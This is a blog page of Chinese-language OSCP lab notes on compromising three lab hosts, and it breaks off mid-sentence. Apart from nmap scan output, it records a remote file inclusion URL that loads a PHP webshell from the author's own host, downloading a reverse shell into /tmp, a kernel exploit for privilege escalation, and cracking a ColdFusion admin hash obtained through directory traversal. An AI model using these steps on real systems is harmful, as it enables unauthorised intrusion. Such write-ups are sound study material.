<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="title: OSCP-lab-notedate: 2020-11-21 08:17:12
tags:OSCP lab10.11.1.5nmap
大概前一個小時我都在try 445 port
基本上 RPCclient 不允許 null session 登入且 smb server 不允許 gues">
    

    <!--Author-->
    
        <meta name="author" content="AStar">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="AStar&#39;s Blog"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="AStar&#39;s Blog"/>

    <!--Type page-->
    
        <meta property="og:type" content="website" />
    

    <!--Page Cover-->
    

        <meta name="twitter:card" content="summary" />
    

    <!-- Title -->
    
    <title>AStar&#39;s Blog</title>

    <!-- Bootstrap Core CSS -->
    <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet"/>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css">
    <link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Google Analytics -->
    


    <!-- favicon -->
    
	
</head>


<body>

    <!-- Menu -->
    <!-- Navigation -->
<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
    <div class="container-fluid">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header page-scroll">
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="/">AStar</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
            <ul class="nav navbar-nav navbar-right">
                
                    <li>
                        <a href="/">
                            
                                Home
                            
                        </a>
                    </li>
                
                    <li>
                        <a href="/archives">
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li>
                        <a href="/tags">
                            
                                Tags
                            
                        </a>
                    </li>
                
                    <li>
                        <a href="/categories">
                            
                                Categories
                            
                        </a>
                    </li>
                
                    <li>
                        <a href="https://github.com/klugjo/hexo-theme-clean-blog">
                            
                                <i class="fa fa-github fa-stack-2x"></i>
                            
                        </a>
                    </li>
                
            </ul>
        </div>
        <!-- /.navbar-collapse -->
    </div>
    <!-- /.container -->
</nav>

    <!-- Main Content -->
    <!-- Page Header -->
<!-- Set your background image for this header in your post front-matter: cover -->

<header class="intro-header" style="background-image: url('https://i.imgur.com/mUijvOa.jpg')">
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <div class="post-heading">
                    <h1>Untitled</h1>
                    
                    <span class="meta">
                        <!-- Date and Author -->
                        
                        
                            2020-12-02
                        
                    </span>
                </div>
            </div>
        </div>
    </div>
</header>

<!-- Post Content -->
<article>
    <div class="container">
        <div class="row">

            <!-- Tags and categories -->
           

            <!-- Gallery -->
            

            <!-- Post Main Content -->
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <hr>
<p>title: OSCP-lab-note<br>date: 2020-11-21 08:17:12</p>
<h2 id="tags"><a href="#tags" class="headerlink" title="tags:"></a>tags:</h2><h1 id="OSCP-lab"><a href="#OSCP-lab" class="headerlink" title="OSCP lab"></a>OSCP lab</h1><h2 id="10-11-1-5"><a href="#10-11-1-5" class="headerlink" title="10.11.1.5"></a>10.11.1.5</h2><p>nmap<br><img src="https://i.imgur.com/gx3HSc6.png" alt=""></p>
<p>大概前一個小時我都在try 445 port</p>
<p>基本上 RPCclient 不允許 null session 登入且 smb server 不允許 guest登入</p>
<p>就不用try那些有的沒的了 因為他後面是靠rpc丟上去 所以兩個有一個權限有寫好就不用想了(血淚)</p>
<p>最後是找到這個<br><a href="https://www.exploit-db.com/exploits/66" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/66</a></p>
<p>洞在 135</p>
<p>然後SP1沒有 <code>whoami</code> 也沒有 <code>echo %USERNAME%</code> 所以我其實根本不知道我登的權限是啥</p>
<p>連 <code>C:\USERS</code> 都沒有XDD</p>
<p>最後原來在 <code>C:\Documents and Settings\Administrator\</code></p>
<p><img src="https://i.imgur.com/RzKU1ia.png" alt=""></p>
<h2 id="10-11-1-8"><a href="#10-11-1-8" class="headerlink" title="10.11.1.8"></a>10.11.1.8</h2><p>先 nmap </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-02 18:04 CST</span><br><span class="line">Stats: 0:22:50 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="line">NSE Timing: About 99.83% done; ETC: 18:27 (0:00:02 remaining)</span><br><span class="line">Nmap scan report for 10.11.1.8</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 990 filtered ports</span><br><span class="line">PORT     STATE  SERVICE     VERSION</span><br><span class="line">21/tcp   open   ftp         vsftpd 2.0.1</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">22/tcp   open   ssh         OpenSSH 3.9p1 (protocol 1.99)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">25/tcp   closed smtp</span><br><span class="line">80/tcp   open   http        Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn&apos;t find any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn&apos;t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /robots.txt: Robots file</span><br><span class="line">|   /icons/: Potentially interesting directory w/ listing on &apos;apache/2.0.52 (centos)&apos;</span><br><span class="line">|   /internal/: Potentially interesting folder</span><br><span class="line">|_  /manual/: Potentially interesting folder</span><br><span class="line">|_http-server-header: Apache/2.0.52 (CentOS)</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server&apos;s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">|_      http://ha.ckers.org/slowloris/</span><br><span class="line">|_http-stored-xss: Couldn&apos;t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-trace: TRACE is enabled</span><br><span class="line">| http-vuln-cve2011-3192: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Apache byterange filter DoS</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  BID:49303  CVE:CVE-2011-3192</span><br><span class="line">|       The Apache web server is vulnerable to a denial of service attack when numerous</span><br><span class="line">|       overlapping byte ranges are requested.</span><br><span class="line">|     Disclosure date: 2011-08-19</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192</span><br><span class="line">|       https://www.tenable.com/plugins/nessus/55976</span><br><span class="line">|       https://www.securityfocus.com/bid/49303</span><br><span class="line">|_      https://seclists.org/fulldisclosure/2011/Aug/175</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:apache:http_server:2.0.52: </span><br><span class="line">|     	CVE-2010-0425	10.0	https://vulners.com/cve/CVE-2010-0425</span><br><span class="line">|     	CVE-2005-2700	10.0	https://vulners.com/cve/CVE-2005-2700</span><br><span class="line">|     	CVE-2011-3192	7.8	https://vulners.com/cve/CVE-2011-3192</span><br><span class="line">|     	CVE-2006-3747	7.6	https://vulners.com/cve/CVE-2006-3747</span><br><span class="line">|     	CVE-2013-2249	7.5	https://vulners.com/cve/CVE-2013-2249</span><br><span class="line">|     	CVE-2005-1344	7.5	https://vulners.com/cve/CVE-2005-1344</span><br><span class="line">|     	CVE-2004-0885	7.5	https://vulners.com/cve/CVE-2004-0885</span><br><span class="line">|     	CVE-2009-1891	7.1	https://vulners.com/cve/CVE-2009-1891</span><br><span class="line">|     	CVE-2009-1890	7.1	https://vulners.com/cve/CVE-2009-1890</span><br><span class="line">|     	CVE-2012-0883	6.9	https://vulners.com/cve/CVE-2012-0883</span><br><span class="line">|     	CVE-2006-4154	6.8	https://vulners.com/cve/CVE-2006-4154</span><br><span class="line">|     	CVE-2005-3357	5.4	https://vulners.com/cve/CVE-2005-3357</span><br><span class="line">|     	CVE-2014-0098	5.0	https://vulners.com/cve/CVE-2014-0098</span><br><span class="line">|     	CVE-2013-6438	5.0	https://vulners.com/cve/CVE-2013-6438</span><br><span class="line">|     	CVE-2011-3368	5.0	https://vulners.com/cve/CVE-2011-3368</span><br><span class="line">|     	CVE-2009-2699	5.0	https://vulners.com/cve/CVE-2009-2699</span><br><span class="line">|     	CVE-2007-6750	5.0	https://vulners.com/cve/CVE-2007-6750</span><br><span class="line">|     	CVE-2005-2728	5.0	https://vulners.com/cve/CVE-2005-2728</span><br><span class="line">|     	CVE-2012-0031	4.6	https://vulners.com/cve/CVE-2012-0031</span><br><span class="line">|     	CVE-2011-3607	4.4	https://vulners.com/cve/CVE-2011-3607</span><br><span class="line">|     	CVE-2011-4317	4.3	https://vulners.com/cve/CVE-2011-4317</span><br><span class="line">|     	CVE-2011-3639	4.3	https://vulners.com/cve/CVE-2011-3639</span><br><span class="line">|     	CVE-2011-3348	4.3	https://vulners.com/cve/CVE-2011-3348</span><br><span class="line">|     	CVE-2011-0419	4.3	https://vulners.com/cve/CVE-2011-0419</span><br><span class="line">|     	CVE-2008-2168	4.3	https://vulners.com/cve/CVE-2008-2168</span><br><span class="line">|     	CVE-2008-0455	4.3	https://vulners.com/cve/CVE-2008-0455</span><br><span class="line">|     	CVE-2007-6388	4.3	https://vulners.com/cve/CVE-2007-6388</span><br><span class="line">|     	CVE-2007-6203	4.3	https://vulners.com/cve/CVE-2007-6203</span><br><span class="line">|     	CVE-2007-5000	4.3	https://vulners.com/cve/CVE-2007-5000</span><br><span class="line">|     	CVE-2007-4465	4.3	https://vulners.com/cve/CVE-2007-4465</span><br><span class="line">|     	CVE-2005-3352	4.3	https://vulners.com/cve/CVE-2005-3352</span><br><span class="line">|     	CVE-2005-2088	4.3	https://vulners.com/cve/CVE-2005-2088</span><br><span class="line">|     	CVE-2016-8612	3.3	https://vulners.com/cve/CVE-2016-8612</span><br><span class="line">|     	CVE-2008-0456	2.6	https://vulners.com/cve/CVE-2008-0456</span><br><span class="line">|_    	CVE-2011-4415	1.2	https://vulners.com/cve/CVE-2011-4415</span><br><span class="line">111/tcp  open   rpcbind     2 (RPC #100000)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">139/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">443/tcp  open   ssl/https?</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn&apos;t find any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn&apos;t find any DOM based XSS.</span><br><span class="line">|_http-stored-xss: Couldn&apos;t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| ssl-ccs-injection: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SSL/TLS MITM vulnerability (CCS Injection)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     Risk factor: High</span><br><span class="line">|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h</span><br><span class="line">|       does not properly restrict processing of ChangeCipherSpec messages,</span><br><span class="line">|       which allows man-in-the-middle attackers to trigger use of a zero</span><br><span class="line">|       length master key in certain OpenSSL-to-OpenSSL communications, and</span><br><span class="line">|       consequently hijack sessions or obtain sensitive information, via</span><br><span class="line">|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.</span><br><span class="line">|           </span><br><span class="line">|     References:</span><br><span class="line">|       http://www.openssl.org/news/secadv_20140605.txt</span><br><span class="line">|       http://www.cvedetails.com/cve/2014-0224</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224</span><br><span class="line">| ssl-dh-params: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  BID:74733  CVE:CVE-2015-4000</span><br><span class="line">|       The Transport Layer Security (TLS) protocol contains a flaw that is</span><br><span class="line">|       triggered when handling Diffie-Hellman key exchanges defined with</span><br><span class="line">|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker</span><br><span class="line">|       to downgrade the security of a TLS session to 512-bit export-grade</span><br><span class="line">|       cryptography, which is significantly weaker, allowing the attacker</span><br><span class="line">|       to more easily break the encryption and monitor or tamper with</span><br><span class="line">|       the encrypted stream.</span><br><span class="line">|     Disclosure date: 2015-5-19</span><br><span class="line">|     Check results:</span><br><span class="line">|       EXPORT-GRADE DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: mod_ssl 2.0.x/512-bit MODP group with safe prime modulus</span><br><span class="line">|             Modulus Length: 512</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 512</span><br><span class="line">|     References:</span><br><span class="line">|       https://weakdh.org</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000</span><br><span class="line">|       https://www.securityfocus.com/bid/74733</span><br><span class="line">|   </span><br><span class="line">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="line">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="line">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="line">|     Check results:</span><br><span class="line">|       WEAK DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: mod_ssl 2.0.x/1024-bit MODP group with safe prime modulus</span><br><span class="line">|             Modulus Length: 1024</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 1024</span><br><span class="line">|     References:</span><br><span class="line">|_      https://weakdh.org</span><br><span class="line">| ssl-poodle: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SSL POODLE information leak</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  BID:70574  CVE:CVE-2014-3566</span><br><span class="line">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other</span><br><span class="line">|           products, uses nondeterministic CBC padding, which makes it easier</span><br><span class="line">|           for man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="line">|           padding-oracle attack, aka the &quot;POODLE&quot; issue.</span><br><span class="line">|     Disclosure date: 2014-10-14</span><br><span class="line">|     Check results:</span><br><span class="line">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.securityfocus.com/bid/70574</span><br><span class="line">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="line">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="line">|_sslv2-drown: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">445/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">631/tcp  open   ipp         CUPS 1.1</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-server-header: CU</span><br></pre></td></tr></table></figure>
<p>80 port長這樣子</p>
<p><img src="https://i.imgur.com/ySKQz8d.png" alt=""></p>
<p>其實看不出什麼鳥，不過 nmap 有幫我們找到相關path</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| http-enum: </span><br><span class="line">|   /robots.txt: Robots file</span><br><span class="line">|   /icons/: Potentially interesting directory w/ listing on &apos;apache/2.0.52 (centos)&apos;</span><br><span class="line">|   /internal/: Potentially interesting folder</span><br><span class="line">|_  /manual/: Potentially interesting folder</span><br></pre></td></tr></table></figure>
<p>其中 <code>/internal/</code> 長這樣<br><img src="https://i.imgur.com/CKrX91X.png" alt=""></p>
<p>從 source code 可以看到系統</p>
<p><img src="https://i.imgur.com/m1rTq4Y.png" alt=""></p>
<p>從searchsploit可以看到兩個洞</p>
<p><img src="https://i.imgur.com/HFgBkTO.png" alt=""></p>
<p>其中SQLi 可以成功，且 admin.php 的密碼就真的是 admin</p>
<p>嘗試RFI</p>
<p><code>https://10.11.1.8/internal//advanced_comment_system/admin.php?&amp;command=ls&amp;ACS_path=http://10.11.0.42:80/exec.php%00</code></p>
<p>記住後面一定要用 <code>%00</code>進行截斷</p>
<p>後面的exec.php是我的一句話</p>
<p>之後就進去 <code>/tmp</code> 下載 php reverse shell 再用一句話跑起來</p>
<p>經驗: wget 沒成功 curl才成功，py reverse shell沒成功(明明有python) php才成功</p>
<p>總之拿到了shell之後 跑了 LinEnum.sh 沒東西</p>
<p>uname -a </p>
<p><code>Linux phoenix 2.6.9-89.EL #1 Mon Jun 22 12:19:40 EDT 2009 i686 i686 i386 GNU/Linux</code> 沒看到OS名稱 cat  /etc/os-release 也沒東西</p>
<p>這時候可以在一句話裡面加上 <code>phpinfo();</code></p>
<p>就可以看到 OS 是 CentOS</p>
<p><img src="https://i.imgur.com/M6nEDXU.png" alt=""></p>
<p>查 exploitdb 有一個洞可用</p>
<p><a href="https://www.exploit-db.com/exploits/9545" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/9545</a></p>
<p>但竟是要搞一個一樣的OS compile 給他</p>
<p>花不少時間終於用好了</p>
<p><img src="https://i.imgur.com/zcy9BIu.png" alt=""></p>
<h2 id="10-11-1-10"><a href="#10-11-1-10" class="headerlink" title="10.11.1.10"></a>10.11.1.10</h2><p>這題主要是沒想到 coldfusion 卡了一天</p>
<p>基本上看到 <code>CFID</code> 就要先想到了</p>
<p>我是看了 nmap 的結果後才知道的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.11.1.10</span><br><span class="line">Host is up (0.19s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /CFIDE/administrator/enter.cfm: </span><br><span class="line">|     CFID: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|     CFTOKEN: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|   /CFIDE/administrator/entman/index.cfm: </span><br><span class="line">|     CFID: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|     CFTOKEN: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|   /CFIDE/administrator/archives/index.cfm: </span><br><span class="line">|     CFID: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|     CFTOKEN: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-csrf: Couldn&apos;t find any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn&apos;t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /CFIDE/administrator/enter.cfm: ColdFusion Admin Console</span><br><span class="line">|   /CFIDE/administrator/entman/index.cfm: ColdFusion Admin Console</span><br><span class="line">|   /cfide/install.cfm: ColdFusion Admin Console</span><br><span class="line">|   /CFIDE/administrator/archives/index.cfm: ColdFusion Admin Console</span><br><span class="line">|   /CFIDE/wizards/common/_logintowizard.cfm: ColdFusion Admin Console</span><br><span class="line">|_  /CFIDE/componentutils/login.cfm: ColdFusion Admin Console</span><br><span class="line">|_http-stored-xss: Couldn&apos;t find any stored XSS vulnerabilities.</span><br><span class="line">| http-vuln-cve2010-2861: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Adobe ColdFusion Directory Traversal Vulnerability</span><br><span class="line">|     State: VULNERABLE (Exploitable)</span><br><span class="line">|     IDs:  BID:42342  CVE:CVE-2010-2861</span><br><span class="line">|       Multiple directory traversal vulnerabilities in the administrator console</span><br><span class="line">|       in Adobe ColdFusion 9.0.1 and earlier allow remote attackers to read arbitrary files via the</span><br><span class="line">|       locale parameter</span><br><span class="line">|     Disclosure date: 2010-08-10</span><br><span class="line">|     Extra information:</span><br><span class="line">|       </span><br><span class="line">|     ColdFusion8</span><br><span class="line">|       HMAC: 7C96F5846DB9D03E3DC07D189656649F0C615BFE</span><br><span class="line">|       Salt: 1581439455878</span><br><span class="line">|       Hash: AAFDC23870ECBCD3D557B6423A8982134E17927E</span><br><span class="line">|   </span><br><span class="line">|     References:</span><br><span class="line">|       http://www.blackhatacademy.org/security101/Cold_Fusion_Hacking</span><br><span class="line">|       https://www.tenable.com/plugins/nessus/48340</span><br><span class="line">|       https://www.securityfocus.com/bid/42342</span><br><span class="line">|       https://nvd.nist.gov/vuln/detail/CVE-2010-2861</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2861</span><br><span class="line">MAC Address: 00:50:56:B8:85:A5 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1600.69 seconds</span><br></pre></td></tr></table></figure>
<p>照著結果進去:</p>
<p><img src="https://i.imgur.com/KKU7NjT.png" alt=""></p>
<p>查了 exploitdb 有個類似 LFI 的東西</p>
<p><a href="https://zeroday.hitcon.org/vulnerability/ZD-2018-01322" target="_blank" rel="noopener">https://zeroday.hitcon.org/vulnerability/ZD-2018-01322</a></p>
<p><a href="https://zeroday.hitcon.org/vulnerability/ZD-2018-01326" target="_blank" rel="noopener">https://zeroday.hitcon.org/vulnerability/ZD-2018-01326</a></p>
<p><a href="https://www.exploit-db.com/exploits/14641" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/14641</a></p>
<p><img src="https://i.imgur.com/j9r8Q8M.png" alt=""></p>
<p>其中看到 password 的 hash</p>
<p>丟去給 john 爆</p>
<p><img src="https://i.imgur.com/CxBO3Am.png" alt=""></p>
<p>因 username 已經幫我們設好 admin 了</p>
<p>因此我們用 <code>pass123</code> 成功進去</p>
<p>接下來就參考</p>
